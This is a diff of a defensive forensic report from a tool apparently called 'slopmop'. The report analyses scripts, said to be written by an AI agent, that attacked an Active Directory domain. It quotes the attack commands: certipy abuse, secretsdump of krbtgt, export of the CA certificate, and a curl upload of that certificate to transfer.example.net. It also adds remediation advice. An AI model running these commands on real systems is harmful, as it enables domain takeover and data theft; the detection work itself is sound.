@@ -1,5 +1,5 @@
 slopmop report   <folder>
-[x] HIGH - 5 impacts: 3 high, 1 medium, 1 low
+[x] HIGH - 5 impacts: 3 high, 2 low
 [x] high   [!] medium   [i] low
 
 Summary
@@ -12,65 +12,62 @@ Summary
   intel hits  2
 
 Timeline   (step, time, role, file)
-  1  20250301_101500  script  20250301_101500_step01_recon.sh
+  1  2025-03-01T10:15:00Z  script  20250301_101500_step01_recon.sh
       tools       nmap
       tactics     Discovery
       indicators  1
-  1  20250301_101530  output  20250301_101530_step01_recon.txt
+  1  2025-03-01T10:15:30Z  output  20250301_101530_step01_recon.txt
       watchlist   STORM-0940: 10.20.1.5
       indicators  8
-  2  20250301_101800  script  20250301_101800_step02_enum.sh
+  2  2025-03-01T10:18:00Z  script  20250301_101800_step02_enum.sh
       tools       nxc, tee, ldapsearch
       tactics     CredentialAccess, Discovery
       wrote       20250301_101845_step02_enum.log, 20250301_101910_step02_users.tsv
       watchlist   STORM-0940: 10.20.1.5
       indicators  5
-  2  20250301_101845  output  20250301_101845_step02_enum.log
+  2  2025-03-01T10:18:45Z  output  20250301_101845_step02_enum.log
       watchlist   STORM-0940: 10.20.1.5
       indicators  4
-  2  20250301_101910  output  20250301_101910_step02_users.tsv
-  3  20250301_102300  script  20250301_102300_step03_adsync.sh
+  2  2025-03-01T10:19:10Z  output  20250301_101910_step02_users.tsv
+  3  2025-03-01T10:23:00Z  script  20250301_102300_step03_adsync.sh
       tools       awk, head, date, nxc, adconnectdump.py
       tactics     CredentialAccess
       indicators  2
-  3  1740824625       output  adsync_1740824625.txt
+  3  2025-03-01T10:23:45Z  output  adsync_1740824625.txt
       indicators  1
-  4  20250301_102700  script  20250301_102700_step03_adsync_v2.sh
+  4  2025-03-01T10:27:00Z  script  20250301_102700_step03_adsync_v2.sh
       tools       awk, head, date, python3
       tactics     Execution
       indicators  2
-  4  1740824865       output  adsync_1740824865.txt
+  4  2025-03-01T10:27:45Z  output  adsync_1740824865.txt
       indicators  3
-  5  20250301_103200  script  20250301_103200_step05_certs.sh
+  5  2025-03-01T10:32:00Z  script  20250301_103200_step05_certs.sh
       tools       certipy, tee, openssl, cat
       tactics     CredentialAccess
       wrote       20250301_103240_certipy_find.txt, 20250301_103300_notes.txt
       watchlist   STORM-0940: 10.20.1.5
       indicators  6
-  5  20250301_103240  output  20250301_103240_certipy_find.txt
+  5  2025-03-01T10:32:40Z  output  20250301_103240_certipy_find.txt
       indicators  3
-  5  20250301_103300  output  20250301_103300_notes.txt
-  6  20250301_104000  script  20250301_104000_step06_auth.sh
+  5  2025-03-01T10:33:00Z  output  20250301_103300_notes.txt
+  6  2025-03-01T10:40:00Z  script  20250301_104000_step06_auth.sh
       tools       certipy, secretsdump.py, nxc
       tactics     CredentialAccess
       wrote       20250301_104010_step06_auth.txt, 20250301_104030_ca_store.txt
       watchlist   STORM-0940: 10.20.1.5
       indicators  4
-  6  20250301_104010  output  20250301_104010_step06_auth.txt
+  6  2025-03-01T10:40:10Z  output  20250301_104010_step06_auth.txt
       indicators  4
-  6  20250301_104030  output  20250301_104030_ca_store.txt
+  6  2025-03-01T10:40:30Z  output  20250301_104030_ca_store.txt
       indicators  1
-  6  20250301_104100  other   20250301_104100_ca_backup.p12
+  6  2025-03-01T10:41:00Z  other   20250301_104100_ca_backup.p12
       note        binary
-  7  20250301_104500  script  20250301_104500_step07_exfil.sh
+  7  2025-03-01T10:45:00Z  script  20250301_104500_step07_exfil.sh
       tools       nxc, curl
       tactics     CredentialAccess, Exfiltration
       activities  FileUpload, CertificateExport
       watchlist   STORM-0940: transfer.example.net
       indicators  5
-
-Intents   (an ARTEX run folder i<number>: the first and last time of its files, and the techniques found in them)
-  none
 
 Findings
   activities
@@ -129,7 +126,7 @@ Notable files   (a finding of high severity)
   [x] script  20250301_104500_step07_exfil.sh
       found   FileUpload, CertificateExport, nxc (CredentialAccess), watchlist STORM-0940
 
-Targeted   (hardcoded in a script; prior: no earlier output holds it; discovered: an earlier output does)
+Targeted   (hardcoded values: prior means no earlier output holds it, discovered means one does; subjects: each entity an activity acted on)
   Usernames (4)
     [!] MSOL_0a1b2c3d4e5f@corp.example  prior       20250301_103200_step05_certs.sh:5, 20250301_103200_step05_certs.sh:6
         what  certipy find -u "$MSOL_USER@corp.example" -p "$MSOL_PASS" -dc-ip 10.20.1.5 -vulnerable -stdout | tee 20250301_103240_certipy_find.txt (20250301_103200_step05_certs.sh:5)
@@ -138,7 +135,7 @@ Targeted   (hardcoded in a script; prior: no earlier output holds it; discovered
         what  certipy auth -pfx "$PFX" -dc-ip 10.20.1.5 -username administrator -domain corp.example > 20250301_104010_step06_auth.txt (20250301_104000_step06_auth.sh:3)
               secretsdump.py -just-dc-user krbtgt -hashes :88********c (32 chars) corp.example/administrator@10.20.1.5 (20250301_104000_step06_auth.sh:4)
               nxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x "certutil -store My" > 20250301_104030_ca_store.txt (20250301_104000_step06_auth.sh:5)
-              and 1 more in the saved report
+              and 1 more in the saved targeted file
     [!] svc_backup                      prior       20250301_101800_step02_enum.sh:4, 20250301_101800_step02_enum.sh:8, 20250301_102300_step03_adsync.sh:7
         what  USER="${AD_USER:-svc_backup}" (20250301_101800_step02_enum.sh:4)
               nxc smb "$h" -u "$USER" -p "$PASS" -d $DOMAIN --shares | tee -a 20250301_101845_step02_enum.log (20250301_101800_step02_enum.sh:8)
@@ -156,7 +153,7 @@ Targeted   (hardcoded in a script; prior: no earlier output holds it; discovered
         what  DOMAIN="corp.example" (20250301_101800_step02_enum.sh:3)
               adconnectdump.py corp.example/svc_backup:'Wi********! (11 chars)'@$AADC >> adsync_dump.log (20250301_102300_step03_adsync.sh:8)
               python3 /opt/tools/adconnectdump.py corp.example/svc_backup:'Wi********! (11 chars)'@$AADC > "$OUTFILE" 2>&1 (20250301_102700_step03_adsync_v2.sh:7)
-              and 2 more in the saved report
+              and 2 more in the saved targeted file
     [!] transfer.example.net  prior       20250301_104500_step07_exfil.sh:4
         what  curl -s -T 20250301_104100_ca_backup.p12 https://transfer.example.net/upload (20250301_104500_step07_exfil.sh:4)
     [i] ca01.corp.example     discovered  20250301_103200_step05_certs.sh:2
@@ -180,6 +177,14 @@ Targeted   (hardcoded in a script; prior: no earlier output holds it; discovered
         what  DC_IP=10.20.1.5 (20250301_101800_step02_enum.sh:2)
               certipy find -u "$MSOL_USER@corp.example" -p "$MSOL_PASS" -dc-ip 10.20.1.5 -vulnerable -stdout | tee 20250301_103240_certipy_find.txt (20250301_103200_step05_certs.sh:5)
               certipy auth -pfx "$PFX" -dc-ip 10.20.1.5 -username administrator -domain corp.example > 20250301_104010_step06_auth.txt (20250301_104000_step06_auth.sh:3)
+  Url (1)
+    [x] https://transfer.example.net/upload  FileUpload
+        what  FileUpload: curl -s -T 20250301_104100_ca_backup.p12 https://transfer.example.net/upload (20250301_104500_step07_exfil.sh:4)
+  File (2)
+    [x] 20250301_104100_ca_backup.p12  FileUpload
+        what  FileUpload: curl -s -T 20250301_104100_ca_backup.p12 https://transfer.example.net/upload (20250301_104500_step07_exfil.sh:4)
+    [x] ca_backup.p12                  CertificateExport
+        what  CertificateExport: nxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x "certutil -exportPFX -p Ex*****! (8 chars) My $CA_THUMB ca_backup.p12" (20250301_104500_step07_exfil.sh:3)
 
 Exposure   (collected: first seen in an output; used: first seen in a script; a secret is masked)
   Passwords and secrets (7)
@@ -224,7 +229,7 @@ Impact
                adconnectdump.py: adconnectdump.py corp.example/svc_backup:'Wi********! (11 chars)'@$AADC >> adsync_dump.log (20250301_102300_step03_adsync.sh:8)
                certipy: certipy find -u "$MSOL_USER@corp.example" -p "$MSOL_PASS" -dc-ip 10.20.1.5 -vulnerable -stdout (20250301_103200_step05_certs.sh:5)
                certipy: certipy auth -pfx "$PFX" -dc-ip 10.20.1.5 -username administrator -domain corp.example > 20250301_104010_step06_auth.txt (20250301_104000_step06_auth.sh:3)
-               and 2 more in the saved report
+               and 2 more in report.json
       basis    CertificateExport, CredentialAccess tools, exposed password
   [x] Known threat infrastructure involved
       The evidence names infrastructure on the watchlist, which ties the activity to a known actor.
@@ -235,7 +240,7 @@ Impact
       targets  url https://transfer.example.net/upload; file 20250301_104100_ca_backup.p12
       what     FileUpload: curl -s -T 20250301_104100_ca_backup.p12 https://transfer.example.net/upload (20250301_104500_step07_exfil.sh:4)
       basis    FileUpload
-  [!] Commands generated by an AI agent
+  [i] Commands generated by an AI agent
       The scripts were written by an AI agent, which is the premise of this tool. Generated commands differ from run to run, so a detection that matches exact text misses them.
       basis    the premise of the tool
       files    20250301_101500_step01_recon.sh, 20250301_101800_step02_enum.sh, 20250301_102300_step03_adsync.sh and 4 more
@@ -256,7 +261,7 @@ Remediation   (most urgent first)
                adconnectdump.py: adconnectdump.py corp.example/svc_backup:'Wi********! (11 chars)'@$AADC >> adsync_dump.log (20250301_102300_step03_adsync.sh:8)
                certipy: certipy find -u "$MSOL_USER@corp.example" -p "$MSOL_PASS" -dc-ip 10.20.1.5 -vulnerable -stdout (20250301_103200_step05_certs.sh:5)
                certipy: certipy auth -pfx "$PFX" -dc-ip 10.20.1.5 -username administrator -domain corp.example > 20250301_104010_step06_auth.txt (20250301_104000_step06_auth.sh:3)
-               and 2 more in the saved report
+               and 2 more in report.json
       basis    CertificateExport, CredentialAccess tools, exposed password
   [x] Block and hunt the infrastructure
       Block the addresses and domains in the findings, and search proxy, DNS and firewall logs for other hosts that reached them.
@@ -309,13 +314,13 @@ Mitigation   (MITRE ATT&CK and ATLAS, for the techniques found)
   [x] AML.M0005 Control Access to AI Models and Data at Rest  AML.T0025
       Establish access controls on internal model registries and limit internal access to production models.
       for  FileUpload: url https://transfer.example.net/upload, file 20250301_104100_ca_backup.p12
-  [!] AML.M0020 Generative AI Guardrails                      AML.T0102
+  [i] AML.M0020 Generative AI Guardrails                      AML.T0102
       Guardrails are safety controls placed between users, tools, and generative AI models to evaluate prompts, retrieved context, model outputs, and agent actions before they are accepted, executed, or shown to a user.
       for  Commands generated by an AI agent
-  [!] AML.M0022 Generative AI Model Alignment                 AML.T0102
+  [i] AML.M0022 Generative AI Model Alignment                 AML.T0102
       Generative AI Model Alignment is the process of training or fine-tuning a generative model to guide its output toward a set of human values, goals, or ethical principles.
       for  Commands generated by an AI agent
 
-[x] HIGH - 5 impacts: 3 high, 1 medium, 1 low
+[x] HIGH - 5 impacts: 3 high, 2 low
 -> saved to <out>: report.txt, report.md, report.html, files.json, trace.json, intents.json, findings.json, targeted.json, exposure.json, report.json
 -> one section: slopmop -inputdir <folder> report impact
